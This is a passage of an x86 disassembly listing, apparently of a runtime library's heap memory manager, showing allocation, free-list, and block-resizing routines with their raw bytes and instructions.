  401cbe:	8b 2c 24             	mov    (%esp),%ebp
  401cc1:	85 ed                	test   %ebp,%ebp
  401cc3:	75 04                	jne    0x401cc9
  401cc5:	33 c0                	xor    %eax,%eax
  401cc7:	eb 30                	jmp    0x401cf9
  401cc9:	8b d5                	mov    %ebp,%edx
  401ccb:	2b d6                	sub    %esi,%edx
  401ccd:	8b c6                	mov    %esi,%eax
  401ccf:	e8 70 fe ff ff       	call   0x401b44
  401cd4:	8b c5                	mov    %ebp,%eax
  401cd6:	03 44 24 04          	add    0x4(%esp),%eax
  401cda:	8b 53 08             	mov    0x8(%ebx),%edx
  401cdd:	03 53 0c             	add    0xc(%ebx),%edx
  401ce0:	3b c2                	cmp    %edx,%eax
  401ce2:	73 0a                	jae    0x401cee
  401ce4:	8d 14 37             	lea    (%edi,%esi,1),%edx
  401ce7:	2b d0                	sub    %eax,%edx
  401ce9:	e8 aa fe ff ff       	call   0x401b98
  401cee:	8b d4                	mov    %esp,%edx
  401cf0:	8b c3                	mov    %ebx,%eax
  401cf2:	e8 b9 f6 ff ff       	call   0x4013b0
  401cf7:	b0 01                	mov    $0x1,%al
  401cf9:	59                   	pop    %ecx
  401cfa:	5a                   	pop    %edx
  401cfb:	5d                   	pop    %ebp
  401cfc:	5f                   	pop    %edi
  401cfd:	5e                   	pop    %esi
  401cfe:	5b                   	pop    %ebx
  401cff:	c3                   	ret
  401d00:	53                   	push   %ebx
  401d01:	56                   	push   %esi
  401d02:	57                   	push   %edi
  401d03:	8b f2                	mov    %edx,%esi
  401d05:	8b f8                	mov    %eax,%edi
  401d07:	8b df                	mov    %edi,%ebx
  401d09:	89 73 08             	mov    %esi,0x8(%ebx)
  401d0c:	8b c3                	mov    %ebx,%eax
  401d0e:	03 c6                	add    %esi,%eax
  401d10:	83 e8 0c             	sub    $0xc,%eax
  401d13:	89 70 08             	mov    %esi,0x8(%eax)
  401d16:	81 fe 00 10 00 00    	cmp    $0x1000,%esi
  401d1c:	7f 30                	jg     0x401d4e
  401d1e:	8b d6                	mov    %esi,%edx
  401d20:	c1 ea 02             	shr    $0x2,%edx
  401d23:	a1 74 c4 40 00       	mov    0x40c474,%eax
  401d28:	8b 44 90 f4          	mov    -0xc(%eax,%edx,4),%eax
  401d2c:	85 c0                	test   %eax,%eax
  401d2e:	75 10                	jne    0x401d40
  401d30:	a1 74 c4 40 00       	mov    0x40c474,%eax
  401d35:	89 5c 90 f4          	mov    %ebx,-0xc(%eax,%edx,4)
  401d39:	89 5b 04             	mov    %ebx,0x4(%ebx)
  401d3c:	89 1b                	mov    %ebx,(%ebx)
  401d3e:	eb 3a                	jmp    0x401d7a
  401d40:	8b 10                	mov    (%eax),%edx
  401d42:	89 43 04             	mov    %eax,0x4(%ebx)
  401d45:	89 13                	mov    %edx,(%ebx)
  401d47:	89 18                	mov    %ebx,(%eax)
  401d49:	89 5a 04             	mov    %ebx,0x4(%edx)
  401d4c:	eb 2c                	jmp    0x401d7a
  401d4e:	81 fe 00 3c 00 00    	cmp    $0x3c00,%esi
  401d54:	7c 0d                	jl     0x401d63
  401d56:	8b d6                	mov    %esi,%edx
  401d58:	8b c7                	mov    %edi,%eax
  401d5a:	e8 09 ff ff ff       	call   0x401c68
  401d5f:	84 c0                	test   %al,%al
  401d61:	75 17                	jne    0x401d7a
  401d63:	a1 68 c4 40 00       	mov    0x40c468,%eax
  401d68:	89 1d 68 c4 40 00    	mov    %ebx,0x40c468
  401d6e:	8b 10                	mov    (%eax),%edx
  401d70:	89 43 04             	mov    %eax,0x4(%ebx)
  401d73:	89 13                	mov    %edx,(%ebx)
  401d75:	89 18                	mov    %ebx,(%eax)
  401d77:	89 5a 04             	mov    %ebx,0x4(%edx)
  401d7a:	5f                   	pop    %edi
  401d7b:	5e                   	pop    %esi
  401d7c:	5b                   	pop    %ebx
  401d7d:	c3                   	ret
  401d7e:	8b c0                	mov    %eax,%eax
  401d80:	83 3d 6c c4 40 00 00 	cmpl   $0x0,0x40c46c
  401d87:	7e 40                	jle    0x401dc9
  401d89:	83 3d 6c c4 40 00 0c 	cmpl   $0xc,0x40c46c
  401d90:	7d 0c                	jge    0x401d9e
  401d92:	c7 05 18 c4 40 00 07 	movl   $0x7,0x40c418
  401d99:	00 00 00 
  401d9c:	eb 2b                	jmp    0x401dc9
  401d9e:	a1 6c c4 40 00       	mov    0x40c46c,%eax
  401da3:	83 c8 02             	or     $0x2,%eax
  401da6:	8b 15 70 c4 40 00    	mov    0x40c470,%edx
  401dac:	89 02                	mov    %eax,(%edx)
  401dae:	a1 70 c4 40 00       	mov    0x40c470,%eax
  401db3:	83 c0 04             	add    $0x4,%eax
  401db6:	e8 b9 fd ff ff       	call   0x401b74
  401dbb:	33 c0                	xor    %eax,%eax
  401dbd:	a3 70 c4 40 00       	mov    %eax,0x40c470
  401dc2:	33 c0                	xor    %eax,%eax
  401dc4:	a3 6c c4 40 00       	mov    %eax,0x40c46c
  401dc9:	c3                   	ret
  401dca:	8b c0                	mov    %eax,%eax
  401dcc:	53                   	push   %ebx
  401dcd:	56                   	push   %esi
  401dce:	57                   	push   %edi
  401dcf:	83 c4 f0             	add    $0xfffffff0,%esp
  401dd2:	8b f0                	mov    %eax,%esi
  401dd4:	8d 3c 24             	lea    (%esp),%edi
  401dd7:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401dd8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401dd9:	8b fc                	mov    %esp,%edi
  401ddb:	e8 a0 ff ff ff       	call   0x401d80
  401de0:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  401de4:	8b d7                	mov    %edi,%edx
  401de6:	b8 78 c4 40 00       	mov    $0x40c478,%eax
  401deb:	e8 5c f5 ff ff       	call   0x40134c
  401df0:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  401df4:	85 db                	test   %ebx,%ebx
  401df6:	75 04                	jne    0x401dfc
  401df8:	33 c0                	xor    %eax,%eax
  401dfa:	eb 52                	jmp    0x401e4e
  401dfc:	8b 07                	mov    (%edi),%eax
  401dfe:	3b d8                	cmp    %eax,%ebx
  401e00:	73 0a                	jae    0x401e0c
  401e02:	e8 b9 fd ff ff       	call   0x401bc0
  401e07:	29 07                	sub    %eax,(%edi)
  401e09:	01 47 04             	add    %eax,0x4(%edi)
  401e0c:	8b 07                	mov    (%edi),%eax
  401e0e:	03 47 04             	add    0x4(%edi),%eax
  401e11:	8b f3                	mov    %ebx,%esi
  401e13:	03 74 24 0c          	add    0xc(%esp),%esi
  401e17:	3b c6                	cmp    %esi,%eax
  401e19:	73 08                	jae    0x401e23
  401e1b:	e8 10 fe ff ff       	call   0x401c30
  401e20:	01 47 04             	add    %eax,0x4(%edi)
  401e23:	8b 07                	mov    (%edi),%eax
  401e25:	03 47 04             	add    0x4(%edi),%eax
  401e28:	3b f0                	cmp    %eax,%esi
  401e2a:	75 11                	jne    0x401e3d
  401e2c:	83 e8 04             	sub    $0x4,%eax
  401e2f:	ba 04 00 00 00       	mov    $0x4,%edx
  401e34:	e8 0b fd ff ff       	call   0x401b44
  401e39:	83 6f 04 04          	subl   $0x4,0x4(%edi)
  401e3d:	8b 07                	mov    (%edi),%eax
  401e3f:	a3 70 c4 40 00       	mov    %eax,0x40c470
  401e44:	8b 47 04             	mov    0x4(%edi),%eax
  401e47:	a3 6c c4 40 00       	mov    %eax,0x40c46c
  401e4c:	b0 01                	mov    $0x1,%al
  401e4e:	83 c4 10             	add    $0x10,%esp
  401e51:	5f                   	pop    %edi
  401e52:	5e                   	pop    %esi
  401e53:	5b                   	pop    %ebx
  401e54:	c3                   	ret
  401e55:	8d 40 00             	lea    0x0(%eax),%eax
  401e58:	53                   	push   %ebx
  401e59:	83 c4 f8             	add    $0xfffffff8,%esp
  401e5c:	8b d8                	mov    %eax,%ebx
  401e5e:	8b d4                	mov    %esp,%edx
  401e60:	8d 43 04             	lea    0x4(%ebx),%eax
  401e63:	e8 70 f8 ff ff       	call   0x4016d8
  401e68:	83 3c 24 00          	cmpl   $0x0,(%esp)
  401e6c:	74 0b                	je     0x401e79
  401e6e:	8b c4                	mov    %esp,%eax
  401e70:	e8 57 ff ff ff       	call   0x401dcc
  401e75:	84 c0                	test   %al,%al
  401e77:	75 04                	jne    0x401e7d
  401e79:	33 c0                	xor    %eax,%eax
  401e7b:	eb 02                	jmp    0x401e7f
  401e7d:	b0 01                	mov    $0x1,%al
  401e7f:	59                   	pop    %ecx
  401e80:	5a                   	pop    %edx
  401e81:	5b                   	pop    %ebx
  401e82:	c3                   	ret
  401e83:	90                   	nop
  401e84:	53                   	push   %ebx
  401e85:	56                   	push   %esi
  401e86:	83 c4 f8             	add    $0xfffffff8,%esp
  401e89:	8b f2                	mov    %edx,%esi
  401e8b:	8b d8                	mov    %eax,%ebx
  401e8d:	8b cc                	mov    %esp,%ecx
  401e8f:	8d 56 04             	lea    0x4(%esi),%edx
  401e92:	8b c3                	mov    %ebx,%eax
  401e94:	e8 cf f8 ff ff       	call   0x401768
  401e99:	83 3c 24 00          	cmpl   $0x0,(%esp)
  401e9d:	74 0b                	je     0x401eaa
  401e9f:	8b c4                	mov    %esp,%eax
  401ea1:	e8 26 ff ff ff       	call   0x401dcc
  401ea6:	84 c0                	test   %al,%al
  401ea8:	75 04                	jne    0x401eae
  401eaa:	33 c0                	xor    %eax,%eax
  401eac:	eb 02                	jmp    0x401eb0
  401eae:	b0 01                	mov    $0x1,%al
  401eb0:	59                   	pop    %ecx
  401eb1:	5a                   	pop    %edx
  401eb2:	5e                   	pop    %esi
  401eb3:	5b                   	pop    %ebx
  401eb4:	c3                   	ret
  401eb5:	8d 40 00             	lea    0x0(%eax),%eax
  401eb8:	33 d2                	xor    %edx,%edx
  401eba:	c1 e8 02             	shr    $0x2,%eax
  401ebd:	3d 00 04 00 00       	cmp    $0x400,%eax
  401ec2:	77 16                	ja     0x401eda
  401ec4:	8b 15 74 c4 40 00    	mov    0x40c474,%edx
  401eca:	8b 54 82 f4          	mov    -0xc(%edx,%eax,4),%edx
  401ece:	85 d2                	test   %edx,%edx
  401ed0:	75 08                	jne    0x401eda
  401ed2:	40                   	inc    %eax
  401ed3:	3d 01 04 00 00       	cmp    $0x401,%eax
  401ed8:	75 ea                	jne    0x401ec4
  401eda:	8b c2                	mov    %edx,%eax
  401edc:	c3                   	ret
  401edd:	8d 40 00             	lea    0x0(%eax),%eax
  401ee0:	53                   	push   %ebx
  401ee1:	56                   	push   %esi
  401ee2:	57                   	push   %edi
  401ee3:	55                   	push   %ebp
  401ee4:	8b f0                	mov    %eax,%esi
  401ee6:	bf 68 c4 40 00       	mov    $0x40c468,%edi
  401eeb:	bd 6c c4 40 00       	mov    $0x40c46c,%ebp
  401ef0:	8b 1d 60 c4 40 00    	mov    0x40c460,%ebx
  401ef6:	3b 73 08             	cmp    0x8(%ebx),%esi
  401ef9:	0f 8e 84 00 00 00    	jle    0x401f83
  401eff:	8b 1f                	mov    (%edi),%ebx
  401f01:	8b 43 08             	mov    0x8(%ebx),%eax
  401f04:	3b f0                	cmp    %eax,%esi
  401f06:	7e 7b                	jle    0x401f83
  401f08:	89 73 08             	mov    %esi,0x8(%ebx)
  401f0b:	8b 5b 04             	mov    0x4(%ebx),%ebx
  401f0e:	3b 73 08             	cmp    0x8(%ebx),%esi
  401f11:	7f f8                	jg     0x401f0b
  401f13:	8b 17                	mov    (%edi),%edx
  401f15:	89 42 08             	mov    %eax,0x8(%edx)
  401f18:	3b 1f                	cmp    (%edi),%ebx
  401f1a:	74 04                	je     0x401f20
  401f1c:	89 1f                	mov    %ebx,(%edi)
  401f1e:	eb 63                	jmp    0x401f83
  401f20:	81 fe 00 10 00 00    	cmp    $0x1000,%esi
  401f26:	7f 0d                	jg     0x401f35
  401f28:	8b c6                	mov    %esi,%eax
  401f2a:	e8 89 ff ff ff       	call   0x401eb8
  401f2f:	8b d8                	mov    %eax,%ebx
  401f31:	85 db                	test   %ebx,%ebx
  401f33:	75 4e                	jne    0x401f83
  401f35:	8b c6                	mov    %esi,%eax
  401f37:	e8 1c ff ff ff       	call   0x401e58
  401f3c:	84 c0                	test   %al,%al
  401f3e:	75 07                	jne    0x401f47
  401f40:	33 c0                	xor    %eax,%eax
  401f42:	e9 88 00 00 00       	jmp    0x401fcf
  401f47:	3b 75 00             	cmp    0x0(%ebp),%esi
  401f4a:	7f a4                	jg     0x401ef0
  401f4c:	29 75 00             	sub    %esi,0x0(%ebp)
  401f4f:	83 7d 00 0c          	cmpl   $0xc,0x0(%ebp)
  401f53:	7d 08                	jge    0x401f5d
  401f55:	03 75 00             	add    0x0(%ebp),%esi
  401f58:	33 c0                	xor    %eax,%eax
  401f5a:	89 45 00             	mov    %eax,0x0(%ebp)
  401f5d:	a1 70 c4 40 00       	mov    0x40c470,%eax
  401f62:	01 35 70 c4 40 00    	add    %esi,0x40c470
  401f68:	8b d6                	mov    %esi,%edx
  401f6a:	83 ca 02             	or     $0x2,%edx
  401f6d:	89 10                	mov    %edx,(%eax)
  401f6f:	83 c0 04             	add    $0x4,%eax
  401f72:	ff 05 fc c3 40 00    	incl   0x40c3fc
  401f78:	83 ee 04             	sub    $0x4,%esi
  401f7b:	01 35 00 c4 40 00    	add    %esi,0x40c400
  401f81:	eb 4c                	jmp    0x401fcf
  401f83:	8b c3                	mov    %ebx,%eax
  401f85:	e8 36 fb ff ff       	call   0x401ac0
  401f8a:	8b 53 08             	mov    0x8(%ebx),%edx
  401f8d:	8b c2                	mov    %edx,%eax
  401f8f:	2b c6                	sub    %esi,%eax
  401f91:	83 f8 0c             	cmp    $0xc,%eax
  401f94:	7c 0c                	jl     0x401fa2
  401f96:	8b d3                	mov    %ebx,%edx
  401f98:	03 d6                	add    %esi,%edx
  401f9a:	92                   	xchg   %eax,%edx
  401f9b:	e8 60 fd ff ff       	call   0x401d00
  401fa0:	eb 12                	jmp    0x401fb4
  401fa2:	8b f2                	mov    %edx,%esi
  401fa4:	3b 1f                	cmp    (%edi),%ebx
  401fa6:	75 05                	jne    0x401fad
  401fa8:	8b 43 04             	mov    0x4(%ebx),%eax
  401fab:	89 07                	mov    %eax,(%edi)
  401fad:	8b c3                	mov    %ebx,%eax
  401faf:	03 c6                	add    %esi,%eax
  401fb1:	83 20 fe             	andl   $0xfffffffe,(%eax)
  401fb4:	8b c3                	mov    %ebx,%eax
  401fb6:	8b d6                	mov    %esi,%edx
  401fb8:	83 ca 02             	or     $0x2,%edx
  401fbb:	89 10                	mov    %edx,(%eax)
  401fbd:	83 c0 04             	add    $0x4,%eax
  401fc0:	ff 05 fc c3 40 00    	incl   0x40c3fc
  401fc6:	83 ee 04             	sub    $0x4,%esi
  401fc9:	01 35 00 c4 40 00    	add    %esi,0x40c400
  401fcf:	5d                   	pop    %ebp
  401fd0:	5f                   	pop    %edi
  401fd1:	5e                   	pop    %esi
  401fd2:	5b                   	pop    %ebx
  401fd3:	c3                   	ret
  401fd4:	55                   	push   %ebp
  401fd5:	8b ec                	mov    %esp,%ebp
  401fd7:	83 c4 f8             	add    $0xfffffff8,%esp
  401fda:	53                   	push   %ebx
  401fdb:	56                   	push   %esi
  401fdc:	57                   	push   %edi
  401fdd:	8b d8                	mov    %eax,%ebx
  401fdf:	80 3d 15 c4 40 00 00 	cmpb   $0x0,0x40c415
  401fe6:	75 13                	jne    0x401ffb
  401fe8:	e8 2b f9 ff ff       	call   0x401918
  401fed:	84 c0                	test   %al,%al
  401fef:	75 0a                	jne    0x401ffb
  401ff1:	33 c0                	xor    %eax,%eax
  401ff3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401ff6:	e9 54 01 00 00       	jmp    0x40214f
  401ffb:	33 f6                	xor    %esi,%esi
  401ffd:	55                   	push   %ebp
  401ffe:	68 48 21 40 00       	push   $0x402148
  402003:	64 ff 36             	push   %fs:(%esi)
  402006:	64 89 26             	mov    %esp,%fs:(%esi)
  402009:	80 3d 32 c0 40 00 00 	cmpb   $0x0,0x40c032
  402010:	74 0a                	je     0x40201c
  402012:	68 1c c4 40 00       	push   $0x40c41c
  402017:	e8 84 f2 ff ff       	call   0x4012a0
  40201c:	83 c3 07             	add    $0x7,%ebx
  40201f:	83 e3 fc             	and    $0xfffffffc,%ebx
  402022:	83 fb 0c             	cmp    $0xc,%ebx
  402025:	7d 05                	jge    0x40202c
  402027:	bb 0c 00 00 00       	mov    $0xc,%ebx
  40202c:	81 fb 00 10 00 00    	cmp    $0x1000,%ebx
  402032:	0f 8f 93 00 00 00    	jg     0x4020cb
  402038:	8b c3                	mov    %ebx,%eax
  40203a:	85 c0                	test   %eax,%eax
  40203c:	79 03                	jns    0x402041
  40203e:	83 c0 03             	add    $0x3,%eax
  402041:	c1 f8 02             	sar    $0x2,%eax
  402044:	8b 15 74 c4 40 00    	mov    0x40c474,%edx
  40204a:	8b 54 82 f4          	mov    -0xc(%edx,%eax,4),%edx
  40204e:	85 d2                	test   %edx,%edx
  402050:	74 79                	je     0x4020cb
  402052:	8b ca                	mov    %edx,%ecx
  402054:	8b c1                	mov    %ecx,%eax
  402056:	03 c3                	add    %ebx,%eax
  402058:	83 20 fe             	andl   $0xfffffffe,(%eax)
  40205b:	8b 42 04             	mov    0x4(%edx),%eax
  40205e:	3b d0                	cmp    %eax,%edx
  402060:	75 1a                	jne    0x40207c
  402062:	8b c3                	mov    %ebx,%eax
  402064:	85 c0                	test   %eax,%eax
  402066:	79 03                	jns    0x40206b
  402068:	83 c0 03             	add    $0x3,%eax
  40206b:	c1 f8 02             	sar    $0x2,%eax
  40206e:	8b 35 74 c4 40 00    	mov    0x40c474,%esi
  402074:	33 ff                	xor    %edi,%edi
  402076:	89 7c 86 f4          	mov    %edi,-0xc(%esi,%eax,4)
  40207a:	eb 26                	jmp    0x4020a2
  40207c:	8b f3                	mov    %ebx,%esi
  40207e:	85 f6                	test   %esi,%esi
  402080:	79 03                	jns    0x402085
  402082:	83 c6 03             	add    $0x3,%esi
  402085:	c1 fe 02             	sar    $0x2,%esi
  402088:	8b 3d 74 c4 40 00    	mov    0x40c474,%edi
  40208e:	89 44 b7 f4          	mov    %eax,-0xc(%edi,%esi,4)
  402092:	8b 32                	mov    (%edx),%esi
  402094:	89 75 f8             	mov    %esi,-0x8(%ebp)
  402097:	8b 75 f8             	mov    -0x8(%ebp),%esi
  40209a:	89 46 04             	mov    %eax,0x4(%esi)
  40209d:	8b 75 f8             	mov    -0x8(%ebp),%esi
  4020a0:	89 30                	mov    %esi,(%eax)
  4020a2:	8b c1                	mov    %ecx,%eax
  4020a4:	8b 52 08             	mov    0x8(%edx),%edx
  4020a7:	83 ca 02             	or     $0x2,%edx
  4020aa:	89 10                	mov    %edx,(%eax)
  4020ac:	83 c0 04             	add    $0x4,%eax
  4020af:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4020b2:	ff 05 fc c3 40 00    	incl   0x40c3fc
  4020b8:	83 eb 04             	sub    $0x4,%ebx
  4020bb:	01 1d 00 c4 40 00    	add    %ebx,0x40c400
  4020c1:	e8 f2 0d 00 00       	call   0x402eb8
  4020c6:	e9 84 00 00 00       	jmp    0x40214f
  4020cb:	3b 1d 6c c4 40 00    	cmp    0x40c46c,%ebx
  4020d1:	7f 4a                	jg     0x40211d
  4020d3:	29 1d 6c c4 40 00    	sub    %ebx,0x40c46c
  4020d9:	83 3d 6c c4 40 00 0c 	cmpl   $0xc,0x40c46c
  4020e0:	7d 0d                	jge    0x4020ef
  4020e2:	03 1d 6c c4 40 00    	add    0x40c46c,%ebx
  4020e8:	33 c0                	xor    %eax,%eax
  4020ea:	a3 6c c4 40 00       	mov    %eax,0x40c46c
  4020ef:	a1 70 c4 40 00       	mov    0x40c470,%eax
  4020f4:	01 1d 70 c4 40 00    	add    %ebx,0x40c470
  4020fa:	8b d3                	mov    %ebx,%edx
  4020fc:	83 ca 02             	or     $0x2,%edx
  4020ff:	89 10                	mov    %edx,(%eax)
  402101:	83 c0 04             	add    $0x4,%eax
  402104:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402107:	ff 05 fc c3 40 00    	incl   0x40c3fc
  40210d:	83 eb 04             	sub    $0x4,%ebx
  402110:	01 1d 00 c4 40 00    	add    %ebx,0x40c400
  402116:	e8 9d 0d 00 00       	call   0x402eb8
  40211b:	eb 32                	jmp    0x40214f
  40211d:	8b c3                	mov    %ebx,%eax
  40211f:	e8 bc fd ff ff       	call   0x401ee0
  402124:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402127:	33 c0                	xor    %eax,%eax
  402129:	5a                   	pop    %edx
  40212a:	59                   	pop    %ecx
  40212b:	59                   	pop    %ecx
  40212c:	64 89 10             	mov    %edx,%fs:(%eax)
  40212f:	68 4f 21 40 00       	push   $0x40214f
  402134:	80 3d 32 c0 40 00 00 	cmpb   $0x0,0x40c032
  40213b:	74 0a                	je     0x402147
  40213d:	68 1c c4 40 00       	push   $0x40c41c
  402142:	e8 61 f1 ff ff       	call   0x4012a8
  402147:	c3                   	ret
  402148:	e9 13 0c 00 00       	jmp    0x402d60
  40214d:	eb e5                	jmp    0x402134
  40214f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402152:	5f                   	pop    %edi
  402153:	5e                   	pop    %esi
  402154:	5b                   	pop    %ebx
  402155:	59                   	pop    %ecx
  402156:	59                   	pop    %ecx
  402157:	5d                   	pop    %ebp
  402158:	c3                   	ret
  402159:	8d 40 00             	lea    0x0(%eax),%eax
  40215c:	55                   	push   %ebp
  40215d:	8b ec                	mov    %esp,%ebp
  40215f:	51                   	push   %ecx
  402160:	53                   	push   %ebx
  402161:	56                   	push   %esi
  402162:	57                   	push   %edi
  402163:	8b d8                	mov    %eax,%ebx
  402165:	33 c0                	xor    %eax,%eax
  402167:	a3 18 c4 40 00       	mov    %eax,0x40c418
  40216c:	80 3d 15 c4 40 00 00 	cmpb   $0x0,0x40c415
  402173:	75 1f                	jne    0x402194
  402175:	e8 9e f7 ff ff       	call   0x401918
  40217a:	84 c0                	test   %al,%al
  40217c:	75 16                	jne    0x402194
  40217e:	c7 05 18 c4 40 00 08 	movl   $0x8,0x40c418
  402185:	00 00 00 
  402188:	c7 45 fc 08 00 00 00 	movl   $0x8,-0x4(%ebp)
  40218f:	e9 61 01 00 00       	jmp    0x4022f5
  402194:	33 c9                	xor    %ecx,%ecx
  402196:	55                   	push   %ebp
  402197:	68 ee 22 40 00       	push   $0x4022ee
  40219c:	64 ff 31             	push   %fs:(%ecx)
  40219f:	64 89 21             	mov    %esp,%fs:(%ecx)
  4021a2:	80 3d 32 c0 40 00 00 	cmpb   $0x0,0x40c032
  4021a9:	74 0a                	je     0x4021b5
  4021ab:	68 1c c4 40 00       	push   $0x40c41c
  4021b0:	e8 eb f0 ff ff       	call   0x4012a0
  4021b5:	8b f3                	mov    %ebx,%esi
  4021b7:	83 ee 04             	sub    $0x4,%esi
  4021ba:	8b 1e                	mov    (%esi),%ebx
  4021bc:	f6 c3 02             	test   $0x2,%bl
  4021bf:	75 0f                	jne    0x4021d0
  4021c1:	c7 05 18 c4 40 00 09 	movl   $0x9,0x40c418
  4021c8:	00 00 00 
  4021cb:	e9 f5 00 00 00       	jmp    0x4022c5
  4021d0:	ff 0d fc c3 40 00    	decl   0x40c3fc
  4021d6:	8b c3                	mov    %ebx,%eax
  4021d8:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  4021dd:	83 e8 04             	sub    $0x4,%eax
  4021e0:	29 05 00 c4 40 00    	sub    %eax,0x40c400
  4021e6:	f6 c3 01             	test   $0x1,%bl
  4021e9:	74 45                	je     0x402230
  4021eb:	8b c6                	mov    %esi,%eax
  4021ed:	83 e8 0c             	sub    $0xc,%eax
  4021f0:	8b 50 08             	mov    0x8(%eax),%edx
  4021f3:	83 fa 0c             	cmp    $0xc,%edx
  4021f6:	7c 08                	jl     0x402200
  4021f8:	f7 c2 03 00 00 80    	test   $0x80000003,%edx
  4021fe:	74 0f                	je     0x40220f
  402200:	c7 05 18 c4 40 00 0a 	movl   $0xa,0x40c418
  402207:	00 00 00 
  40220a:	e9 b6 00 00 00       	jmp    0x4022c5
  40220f:	8b c6                	mov    %esi,%eax
  402211:	2b c2                	sub    %edx,%eax
  402213:	3b 50 08             	cmp    0x8(%eax),%edx
  402216:	74 0f                	je     0x402227
  402218:	c7 05 18 c4 40 00 0a 	movl   $0xa,0x40c418
  40221f:	00 00 00 
  402222:	e9 9e 00 00 00       	jmp    0x4022c5
  402227:	03 da                	add    %edx,%ebx
  402229:	8b f0                	mov    %eax,%esi
  40222b:	e8 90 f8 ff ff       	call   0x401ac0
  402230:	81 e3 fc ff ff 7f    	and    $0x7ffffffc,%ebx
  402236:	8b c6                	mov    %esi,%eax
  402238:	03 c3                	add    %ebx,%eax
  40223a:	8b f8                	mov    %eax,%edi
  40223c:	3b 3d 70 c4 40 00    	cmp    0x40c470,%edi
  402242:	75 2c                	jne    0x402270
  402244:	29 1d 70 c4 40 00    	sub    %ebx,0x40c470
  40224a:	01 1d 6c c4 40 00    	add    %ebx,0x40c46c
  402250:	81 3d 6c c4 40 00 00 	cmpl   $0x3c00,0x40c46c
  402257:	3c 00 00 
  40225a:	7e 05                	jle    0x402261
  40225c:	e8 1f fb ff ff       	call   0x401d80
  402261:	33 c0                	xor    %eax,%eax
  402263:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402266:	e8 4d 0c 00 00       	call   0x402eb8
  40226b:	e9 85 00 00 00       	jmp    0x4022f5
  402270:	8b 10                	mov    (%eax),%edx
  402272:	f6 c2 02             	test   $0x2,%dl
  402275:	74 1c                	je     0x402293
  402277:	81 e2 fc ff ff 7f    	and    $0x7ffffffc,%edx
  40227d:	83 fa 04             	cmp    $0x4,%edx
  402280:	7d 0c                	jge    0x40228e
  402282:	c7 05 18 c4 40 00 0b 	movl   $0xb,0x40c418
  402289:	00 00 00 
  40228c:	eb 37                	jmp    0x4022c5
  40228e:	83 08 01             	orl    $0x1,(%eax)
  402291:	eb 29                	jmp    0x4022bc
  402293:	8b c7                	mov    %edi,%eax
  402295:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  402299:	74 0b                	je     0x4022a6
  40229b:	83 38 00             	cmpl   $0x0,(%eax)
  40229e:	74 06                	je     0x4022a6
  4022a0:	83 78 08 0c          	cmpl   $0xc,0x8(%eax)
  4022a4:	7d 0c                	jge    0x4022b2
  4022a6:	c7 05 18 c4 40 00 0b 	movl   $0xb,0x40c418
  4022ad:	00 00 00 
  4022b0:	eb 13                	jmp    0x4022c5
  4022b2:	8b 50 08             	mov    0x8(%eax),%edx
  4022b5:	03 da                	add    %edx,%ebx
  4022b7:	e8 04 f8 ff ff       	call   0x401ac0
  4022bc:	8b d3                	mov    %ebx,%edx
  4022be:	8b c6                	mov    %esi,%eax
  4022c0:	e8 3b fa ff ff       	call   0x401d00
  4022c5:	a1 18 c4 40 00       	mov    0x40c418,%eax
  4022ca:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4022cd:	33 c0                	xor    %eax,%eax
  4022cf:	5a                   	pop    %edx
  4022d0:	59                   	pop    %ecx
  4022d1:	59                   	pop    %ecx
  4022d2:	64 89 10             	mov    %edx,%fs:(%eax)
  4022d5:	68 f5 22 40 00       	push   $0x4022f5
  4022da:	80 3d 32 c0 40 00 00 	cmpb   $0x0,0x40c032
  4022e1:	74 0a                	je     0x4022ed
  4022e3:	68 1c c4 40 00       	push   $0x40c41c
  4022e8:	e8 bb ef ff ff       	call   0x4012a8
  4022ed:	c3                   	ret
  4022ee:	e9 6d 0a 00 00       	jmp    0x402d60
  4022f3:	eb e5                	jmp    0x4022da
  4022f5:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4022f8:	5f                   	pop    %edi
  4022f9:	5e                   	pop    %esi
  4022fa:	5b                   	pop    %ebx
  4022fb:	59                   	pop    %ecx
  4022fc:	5d                   	pop    %ebp
  4022fd:	c3                   	ret
  4022fe:	8b c0                	mov    %eax,%eax
  402300:	53                   	push   %ebx
  402301:	56                   	push   %esi
  402302:	57                   	push   %edi
  402303:	55                   	push   %ebp
  402304:	83 c4 f8             	add    $0xfffffff8,%esp
  402307:	8b f2                	mov    %edx,%esi
  402309:	83 c6 07             	add    $0x7,%esi
  40230c:	83 e6 fc             	and    $0xfffffffc,%esi
  40230f:	83 fe 0c             	cmp    $0xc,%esi
  402312:	7d 05                	jge    0x402319
  402314:	be 0c 00 00 00       	mov    $0xc,%esi
  402319:	8b e8                	mov    %eax,%ebp
  40231b:	83 ed 04             	sub    $0x4,%ebp
  40231e:	8b 7d 00             	mov    0x0(%ebp),%edi
  402321:	81 e7 fc ff ff 7f    	and    $0x7ffffffc,%edi
  402327:	8b c5                	mov    %ebp,%eax
  402329:	03 c7                	add    %edi,%eax
  40232b:	8b d8                	mov    %eax,%ebx
  40232d:	3b fe                	cmp    %esi,%edi
  40232f:	0f 82 83 00 00 00    	jb     0x4023b8
  402335:	8b d7                	mov    %edi,%edx
  402337:	2b d6                	sub    %esi,%edx
  402339:	89 14 24             	mov    %edx,(%esp)
  40233c:	3b 1d 70 c4 40 00    	cmp    0x40c470,%ebx
  402342:	75 38                	jne    0x40237c
  402344:	8b 04 24             	mov    (%esp),%eax
  402347:	29 05 70 c4 40 00    	sub    %eax,0x40c470
  40234d:	8b 04 24             	mov    (%esp),%eax
  402350:	01 05 6c c4 40 00    	add    %eax,0x40c46c
  402356:	83 3d 6c c4 40 00 0c 	cmpl   $0xc,0x40c46c
  40235d:	0f 8d 4c 01 00 00    	jge    0x4024af
  402363:	8b 04 24             	mov    (%esp),%eax
  402366:	01 05 70 c4 40 00    	add    %eax,0x40c470
  40236c:	8b 04 24             	mov    (%esp),%eax
